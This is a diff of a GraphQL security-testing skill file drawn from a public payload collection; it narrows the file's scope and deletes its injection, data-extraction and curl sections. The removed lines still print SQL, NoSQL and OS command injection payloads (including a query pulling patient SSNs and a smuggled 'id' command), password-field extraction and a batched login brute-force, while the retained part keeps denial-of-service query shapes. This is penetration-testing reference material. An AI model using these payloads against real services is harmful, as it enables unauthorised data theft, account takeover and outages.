@@ -1,5 +1,5 @@
 ---
-description: Introspection, batching, field suggestion, injection in variables
+description: Endpoint discovery, introspection, batching, field suggestion, DoS shapes
 skill: graphql-testing
 source: PayloadsAllTheThings — GraphQL Injection
 source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
@@ -100,51 +100,6 @@ Response: `Cannot query field 'doesnotexist' on type 'Query'. Did you mean 'user
 
 Response: `Did you mean 'username', 'email', 'password'?`
 
-## Injection in Variables
-
-### SQL Injection via GraphQL
-
-```graphql
-{
-  user(id: "1' OR 1=1--") {
-    id
-    username
-    email
-  }
-}
-```
-
-```graphql
-{
-  product(id: "1' UNION SELECT username,password FROM users--") {
-    name
-    price
-  }
-}
-```
-
-### NoSQL Injection via GraphQL
-
-```graphql
-{
-  doctors(search: "{\"patients.ssn\": {\"$regex\": \".*\"}, \"lastName\": \"Admin\"}") {
-    firstName
-    lastName
-    patients { ssn }
-  }
-}
-```
-
-### OS Command Injection
-
-```graphql
-{
-  systemHealth(host: "127.0.0.1; id") {
-    status
-  }
-}
-```
-
 ## Denial of Service
 
 ### Deeply Nested Query
@@ -176,34 +131,4 @@ Response: `Did you mean 'username', 'email', 'password'?`
   a3: users { id name }
   # ... repeat 1000 times
 }
-```
-
-## Data Extraction
-
-```graphql
-# Enumerate all users
-{users{id username email role}}
-
-# Access admin-only fields
-{user(id:1){id username email password isAdmin}}
-
-# Dump all records
-{teams{total_count edges{node{id name handle state}}}}
-```
-
-## Curl Examples
-
-```bash
-# Introspection query
-curl -s -X POST http://target/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{__schema{types{name}}}"}'
-
-# Batched login brute-force
-curl -s -X POST http://target/graphql \
-  -H "Content-Type: application/json" \
-  -d '[{"query":"mutation{login(u:\"admin\",p:\"pass1\"){token}}"},{"query":"mutation{login(u:\"admin\",p:\"pass2\"){token}}"}]'
-
-# GET-based query
-curl "http://target/graphql?query=\{__schema\{types\{name\}\}\}"
 ```
